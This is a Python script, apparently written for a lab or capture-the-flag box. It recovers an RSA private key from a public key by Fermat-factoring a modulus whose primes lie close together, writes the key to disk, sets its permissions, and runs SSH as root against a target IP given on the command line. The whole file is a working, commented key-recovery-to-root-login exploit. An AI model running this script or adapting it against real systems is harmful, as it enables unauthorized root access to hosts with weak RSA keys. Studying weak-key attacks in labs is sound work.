#!/usr/bin/env python3

# Used to read command-line arguments.
# Example:
# python3 build_key.py 10.49.142.131
import sys

# Used to run shell commands from Python
# (chmod, ssh, etc.)
import subprocess

# Integer square root.
# Needed for Fermat factorization.
# isqrt(10) = 3
from math import isqrt

# PyCryptodome RSA library.
# Used to:
# 1. Import public key
# 2. Build reconstructed private key
from Crypto.PublicKey import RSA


# ============================================================
# Fermat Factorization
# ============================================================
#
# Goal:
# Recover p and q from public modulus n.
#
# Idea:
#
# n = p*q
#
# If p and q are CLOSE primes:
#
# p = a-b
# q = a+b
#
# Then:
#
# n = (a-b)(a+b)
#
# Using algebra:
#
# (a-b)(a+b) = a²-b²
#
# Therefore:
#
# n = a²-b²
#
# Rearranging:
#
# b² = a²-n
#
# So:
#
# 1. Start near sqrt(n)
# 2. Keep increasing a
# 3. Compute a²-n
# 4. If result becomes perfect square:
#       b² = a²-n
#       b = sqrt(b²)
#
# Then:
#
# p = a+b
# q = a-b
#
# ============================================================

def factorize(n):

    # Even numbers always divisible by 2.
    # Quick shortcut case.
    if (n & 1) == 0:
        return (n // 2, 2)

    # Start near sqrt(n)
    a = isqrt(n)

    # If n is already perfect square:
    # n = a*a
    if a*a == n:
        return (a,a)

    # Keep searching forever.
    while True:

        # Move upward from sqrt(n)
        a += 1

        # Compute:
        # b² = a²-n
        bsq = a*a - n

        # Integer square root candidate
        b = isqrt(bsq)

        # Check:
        # Did we find perfect square?
        if b*b == bsq:

            # Recover factors
            p = a+b
            q = a-b

            return (p,q)


# ============================================================
# Command-line Argument Check
# ============================================================

# Expect:
# python3 build_key.py TARGET_IP

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <TARGET_IP>")
    sys.exit(1)

TARGET_IP = sys.argv[1]


# ============================================================
# Read Public Key
# ============================================================

# Load pub.pem
with open("pub.pem","rb") as f:

    # Parse PEM public key
    pub = RSA.import_key(f.read())


# Extract public RSA values.
#
# Public key contains:
#
# (n,e)
#
n = pub.n
e = pub.e

print("[+] Extracted public key")
print("[+] e =", e)


# ============================================================
# Recover p and q using Fermat
# ============================================================

print("[+] Running Fermat factorization...")

p,q = factorize(n)

print("[+] p =", p)
print("[+] q =", q)

print("[+] Difference between primes =", abs(p-q))


# ============================================================
# Compute Totient
# ============================================================
#
# RSA uses:
#
# φ(n) = (p−1)(q−1)
#
# Needed to compute private exponent d.
#
phi = (p-1)*(q-1)

print("[+] Computed phi(n)")


# ============================================================
# Compute d (Private Exponent)
# ============================================================
#
# RSA condition:
#
# e*d ≡ 1 mod φ(n)
#
# d is modular inverse of e.
#
# Python:
#
# pow(e,-1,phi)
#
# means:
#
# "Find modular inverse of e modulo phi"
#
d = pow(e,-1,phi)
    
print("[+] Computed private exponent d")


# ============================================================
# Build Private Key
# ============================================================
#
# RSA private key contains:
#
# n,e,d,p,q
#
# We now possess all of them.
#
key = RSA.construct((n,e,d,p,q))

print("[+] Built reconstructed private key")


# ============================================================
# Save Key
# ============================================================

with open("id_rsa_recovered","wb") as f:

    # Export PEM private key
    f.write(key.export_key())

print("[+] Saved: id_rsa_recovered")


# ============================================================
# Fix File Permissions
# ============================================================
#
# SSH refuses insecure permissions.
#
# chmod 600
#
subprocess.run(["chmod","600","id_rsa_recovered"])

print("[+] Permissions fixed")


# ============================================================
# SSH Login
# ============================================================

print(f"[+] Connecting to root@{TARGET_IP}")

subprocess.run([
    "ssh",
    "-i","id_rsa_recovered",
    f"root@{TARGET_IP}"
])